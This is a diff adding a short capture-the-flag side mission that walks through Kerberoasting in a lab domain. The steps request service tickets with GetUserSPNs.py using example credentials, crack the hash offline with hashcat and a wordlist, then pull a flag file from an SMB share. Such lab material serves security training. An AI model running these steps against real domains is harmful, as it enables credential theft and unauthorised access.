@@ -1,0 +1,24 @@
+Side Mission: Ticket in the Shadows
+
+Target Domain: corp.target.local
+
+Objective:
+Exploit a weak Service Principal Name (SPN) using Kerberoasting to extract a flag.
+
+Steps:
+1. Dump SPNs and request TGS ticket:
+   GetUserSPNs.py -request corp.local/jane.doe:Password123
+
+2. Output includes:
+   ServicePrincipalName: MSSQLSvc/db.corp.local:1433
+   Hash: $krb5tgs$23$svc_sql$...
+
+3. Crack the ticket offline:
+   hashcat -m 13100 spn.hash rockyou.txt --force
+
+4. Use cracked credentials to access secured share:
+   smbclient \\DC01\secure -U svc_sql
+   get flag.txt
+
+Flag:
+CTF{d0m41n_r0yal_br34k}
